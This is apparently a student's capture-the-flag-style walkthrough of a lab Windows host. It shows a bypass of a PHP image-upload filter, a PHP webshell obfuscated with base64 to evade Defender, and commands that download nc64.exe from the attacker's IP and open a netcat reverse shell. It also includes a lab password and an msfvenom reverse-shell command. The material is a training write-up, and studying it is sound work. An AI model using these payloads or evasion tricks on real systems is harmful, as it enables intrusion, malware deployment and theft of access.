---
cover: >-
  https://images.unsplash.com/photo-1541728472741-03e45a58cf88?crop=entropy&cs=srgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHNlYXJjaHw5fHxoYWNrZXJ8ZW58MHx8fHwxNjQ0OTUxOTI2&ixlib=rb-1.2.1&q=85
coverY: 421.77650429799417
description: Isolated - Connected only to the other Windows machine!
---

# ðŸ”° 10.200.81.100 | Windows

* [ ] VPN
* [ ] `sshuttle`
* [ ] `evil-winrm` session --> Chisel server
* [ ] Chisel client
* [ ] Foxyproxy socks5 - switch proxy
* [ ] The webshell should still be there. Access the webshell, then initiate RCE again.

## <mark style="color:purple;background-color:green;">\_\_Enumeration\_\_</mark>

<details>

<summary><mark style="color:purple;">NMAP</mark></summary>

```
-------------FROM LINUX HOST---------------
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100) are filtered
MAC Address: 02:0C:B8:82:73:37 (Unknown)
```

```
-------------FROM WINDOWS HOST---------------
Hostname          OpenPorts
--------          ---------
10.200.81.100     80,3389
```

</details>

<details>

<summary><mark style="color:green;">Web Services</mark></summary>

**Technologies**

![](<../../.gitbook/assets/image (5) (1).png>)\
Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11 Server at 10.200.81.100 Port 80

**Dirsearch | Gobuster**

```yaml
/.git/
```

#### Page Screenshots

![](<../../.gitbook/assets/image (11).png>)

</details>

## <mark style="color:red;background-color:yellow;">\_\_Exploitation\_\_</mark>

## _<mark style="color:orange;">FOOTHOLD</mark>_

* Two ways - Use GitTools over the socks5 proxy (_VERY SLOW_)
* OR, We already have persistent access to Git-Serv, find the .git folder, download and dump the contents locally.

### Finding and dumping the Source Code from `Git-Serv` for the Development Server

![](<../../.gitbook/assets/image (21).png>)![](<../../.gitbook/assets/image (22).png>)\
Download it using the `download <path>` feature. Do specify the absolute path to the <mark style="color:blue;">Website.git</mark> directory!\
![](<../../.gitbook/assets/image (7) (1).png>)\
![](<../../.gitbook/assets/image (18).png>)\
Checking out the <mark style="color:red;">latest commit</mark>, we see an **upload functionality** at `resources/index.php`

```php
<?php
        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }


        if(isset($_GET["msg"])){
                $msg = $_GET["msg"];
                switch ($msg) {
                        case "Success":
                                $res = "File uploaded successfully!";
                                break;
                        case "Fail":
                                $res = "Invalid File Type";
                                break;
                        case "Exists":
                                $res = "File already exists";
                                break;
                        case "Method":
                                $res = "No file send";
                                break;

                }
        }
?>
<!DOCTYPE html>
<html lang=en>
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
        <head>
                <title>Ruby Pictures</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
        </head>
        <body>
                <main>
                        <h1>Welcome Thomas!</h1>
                        <h2>Ruby Image Upload Page</h2>
                        <form method="post" enctype="multipart/form-data">
                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
                        </form>
                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
                </main>
        </body>
</html>
```

### PHP Code Review and Authentication

* Two filters in place: \
  1\) It is using the _getimagesize()_ function to check for the presence of dimensions encoded in their exif data. <mark style="color:red;background-color:purple;">**THIS IS VULNERABLE, but harder!**</mark> \ <mark style="color:red;background-color:purple;">****</mark>_OR_\
  2\) Using the `explode()` function to as a file-extension filter against a whitelist. <mark style="color:red;background-color:purple;">**THIS IS VULNERABLE!**</mark>&#x20;

```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
        header("location: ./?msg=Fail");
        die();
```

* <mark style="color:green;">**The easier vulnerability**</mark>** -**\
  The `explode()` function is used to split a string at the specified character. Here it's being used to split the name of the file we uploaded at each period (`.`). \
  For a file called `image.jpeg`, this function would return the second element from the list: `["image", "jpeg"]` --> jpeg.\
  But for more than one file extension - `image.jpeg.php`. The filename gets split into `["image", "jpeg", "php"]`, but only the `jpeg` (as the second element in the list) gets passed into the filter!\\\

* <mark style="color:green;">**The harder vulnerability**</mark>** -**\
  ****Refer - [https://doddsecurity.com/94/remote-code-execution-in-the-avatars/](https://doddsecurity.com/94/remote-code-execution-in-the-avatars/)\
  This filter is checking for attributes that only an image will have, hence we will have to use a genuine image file.\
  Using `exiftool -Comment`, we can embed PHP code inside its metadata for the `getimagesize()` to execute.\
  Test code --> _`exiftool -Comment="`<mark style="color:yellow;">`<?php echo \"<pre>Test Payload</pre>\"; die(); ?>`</mark>`" test-dexter9.jpeg.php`_\
  _``_![](<../../.gitbook/assets/image (17).png>)![](<../../.gitbook/assets/image (14).png>)\


{% hint style="info" %}
There is an AV running on Thomas' personal PC. Any simple rce won't work!
{% endhint %}

* **Going to `/resources` - Auth required!**

![](<../../.gitbook/assets/image (6) (1).png>)

In the `apache/conf/` directory, we see many directories in which every Authentication is done using the `C:/GitStack/data/passwdfile` which we discovered previously.\
![](<../../.gitbook/assets/image (9).png>)\
So the user and password to login --> **`twreath`** or **`Thomas : i<3ruby` ** \
![](<../../.gitbook/assets/image (5).png>)\
All the images get stored in the `/resources/uploads/` directory with the original name!

## <mark style="color:red;">Evading the AV and GAIN RCE</mark>

#### Simple PHP Code Obfuscator - [https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

* PHP Code for RCE

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

*   **Obfuscating the code to evade the antivirus**

    The variety of measures include :

    * Not using the "classic" code execution method.
    * Switching parts of the exploit around so that they're in an unusual order
    * Encoding all of the strings so that they're not recognizable
    * Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)

```php
<?php $c0=$_GET[base64_decode('d3JlYXRo')];if(isset($c0)){echo base64_decode('PHByZT4=').shell_exec($c0).base64_decode('PC9wcmU+');}die();?>
```

* Uploading properly and gaining code execution at `http://10.200.81.100/resources/uploads/rce-dexter9.jpeg.php?wreath=systeminfo`\
  ![](<../../.gitbook/assets/image (8).png>)\
  ![](<../../.gitbook/assets/image (10).png>) User - _<mark style="color:purple;">wreath-pc\thomas</mark>_

### REVERSE SHELL

Realistically we have several options here:

* Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
* We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
* We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com) (though old) might give us what we need. There are easier options though.
* We could upload netcat. This is the quick and easy option.

Now there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Get from [here](https://github.com/int0x33/nc.exe/).

This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you'd prefer to just use the default binaries then just skip to the last section of this task and use the `nc64.exe` binary from the repository.

### Transfer the pre-compiled `nc64.exe` and execute using PS

* It is able to connect to our machine because of the SOCKS5 proxy over the sshuttle connection. Using curl, initiate the transfer or alternatively use certutil -\
  ![](<../../.gitbook/assets/image (7).png>)``\
  `/rce-dexter9.jpeg.php?wreath=curl 10.50.82.178:9081/nc64.exe -o c:\\Windows\\temp\\nc-dexter9.exe` (escape backslashes)
* Start a listener on the attacker host. Then callback -\
  `/rce-dexter9.jpeg.php?wreath=powershell.exe c:\\windows\\temp\\nc-dexter9.exe 10.50.82.178 12345 -e cmd.exe`\
  ![](<../../.gitbook/assets/image (6).png>)

{% hint style="info" %}
_We had to wrap the netcat command inside a powershell process to keep it from exiting early._
{% endhint %}

## _<mark style="color:red;">PRIVILEGE ESCALATION</mark>_

* Checking for user privileges - `whoami /priv`&#x20;

![](<../../.gitbook/assets/image (13).png>)

This won't help much as it would elevate us only to XAMP





Cross compilation is an essential skill -- although in many ways it's preferable to avoid it.

First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we're doing here), or even software for an embedded device or phone.

Whilst cross-compilation is a very useful skill to have, it's often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it's essential that we get the same arch as that of the target -- a 64 bit program won't work very well on a 32 bit target!

Sometimes it's easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:\
`sudo apt install mingw-w64`\


This is a big package, but once it's installed we can start re-compiling netcat.

Much like we use `gcc` to compile binaries on Linux, we can use the `mingw` compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that's of particular importance to us here is `x86_64-w64-mingw32-gcc`. This specifies that we want to compile a 64bit binary.

Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the `Makefile` with your favourite text editor. The first two lines specify which compiler to use:\
![The first two lines of the Makefile at their default](https://assets.tryhackme.com/additional/wreath-network/499921a44689.png)

Neither of these are quite what we're looking for, so comment out the first line and add another line underneath:\
`CC=x86_64-w64-mingw32-gcc`\
![The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three](https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png)

Now when we run `make` to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to `/dev/null` in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.\
__

__

Try generating a metasploit reverse shell and transfer it to the target (`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT`) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious.

You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.
